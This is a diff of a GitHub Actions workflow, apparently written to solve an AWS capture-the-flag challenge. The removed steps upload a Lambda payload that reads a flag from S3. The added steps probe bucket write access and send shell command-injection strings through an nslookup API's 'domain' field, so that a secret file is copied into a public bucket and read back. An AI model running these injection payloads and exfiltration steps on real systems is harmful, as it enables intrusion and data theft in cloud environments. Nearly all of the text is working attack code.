@@ -19,52 +19,47 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: Try UpdateFunctionCode with flag-returning Lambda
+      - name: Test PutObject on all buckets
         run: |
-          mkdir -p /tmp/lsrc
-          printf '%s\n' \
-            'import boto3' \
-            'def lambda_handler(event, context):' \
-            '    try:' \
-            '        s3 = boto3.client("s3", region_name="us-east-1")' \
-            '        obj = s3.get_object(Bucket="codec4f26c862a321ef5", Key="flag.txt")' \
-            '        flag = obj["Body"].read().decode("utf-8")' \
-            '    except Exception as e:' \
-            '        flag = "s3 error: " + str(e)' \
-            '    return flag' \
-            > /tmp/lsrc/lambda_function.py
-          cat /tmp/lsrc/lambda_function.py
-          cd /tmp/lsrc && zip /tmp/payload.zip lambda_function.py
-          aws lambda update-function-code \
-            --function-name nslookupv2 \
-            --zip-file fileb:///tmp/payload.zip \
-            --region us-east-1 && echo "UPDATE OK" || echo "UpdateFunctionCode: denied"
+          echo "probe" > /tmp/probe.txt
+          aws s3 cp /tmp/probe.txt s3://site781fe43f26b9eba3/probe.txt && echo "PUT SITE: OK" || echo "PUT SITE: denied"
+          aws s3 cp /tmp/probe.txt s3://platform-bucket-009661764077-us-east-1/probe.txt && echo "PUT PLATFORM: OK" || echo "PUT PLATFORM: denied"
+          aws s3 cp /tmp/probe.txt s3://codec4f26c862a321ef5/probe.txt && echo "PUT CODEC: OK" || echo "PUT CODEC: denied"
 
-      - name: Wait for update to propagate
-        run: sleep 8
-
-      - name: Hit API after update
+      - name: Test GetObject on site and platform buckets
         run: |
-          curl -si -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":"x"}'
+          aws s3 cp s3://site781fe43f26b9eba3/index.html - && echo "GET SITE: OK" || echo "GET SITE: denied"
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/dotgit.zip /tmp/dotgit.zip && echo "GET PLATFORM: OK" || echo "GET PLATFORM: denied"
 
-      - name: Probe CloudFront paths from runner (not geo-blocked like your browser)
-        run: |
-          echo "===== GET / ====="
-          curl -si https://d67nf28gqfurd.cloudfront.net/ | head -30
-          echo "===== POST /nslookup ====="
-          curl -si -X POST https://d67nf28gqfurd.cloudfront.net/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":"example.com"}'
-
-      - name: Inject - write flag to site bucket then read via cicdRole
+      - name: Injection round 1 - find aws CLI path and write to site bucket
         run: |
           curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" \
-            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1"}'
-          sleep 8
-          echo "===== read back via cicdRole ====="
-          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || echo "denied"
-          echo "===== read via CloudFront from runner ====="
-          curl -si https://d67nf28gqfurd.cloudfront.net/flag.txt
+            -d '{"domain":";find /opt -name aws 2>/dev/null | head -5 > /tmp/out.txt; cat /tmp/out.txt; aws s3 cp /tmp/out.txt s3://site781fe43f26b9eba3/awspath.txt --region us-east-1 2>&1"}'
+          sleep 6
+
+      - name: Injection round 2 - try all known CLI paths to copy flag
+        run: |
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>&1"}'
+          sleep 3
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";/opt/aws/dist/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>&1"}'
+          sleep 3
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";/opt/awscli/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>&1"}'
+          sleep 6
+
+      - name: Read everything back from site bucket
+        run: |
+          echo "===== list site bucket root ====="
+          aws s3 ls s3://site781fe43f26b9eba3/ || true
+          echo "===== awspath.txt ====="
+          aws s3 cp s3://site781fe43f26b9eba3/awspath.txt - || echo "not found"
+          echo "===== flag.txt ====="
+          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || echo "not found"
+          echo "===== probe.txt (confirms PUT worked) ====="
+          aws s3 cp s3://site781fe43f26b9eba3/probe.txt - || echo "not found"
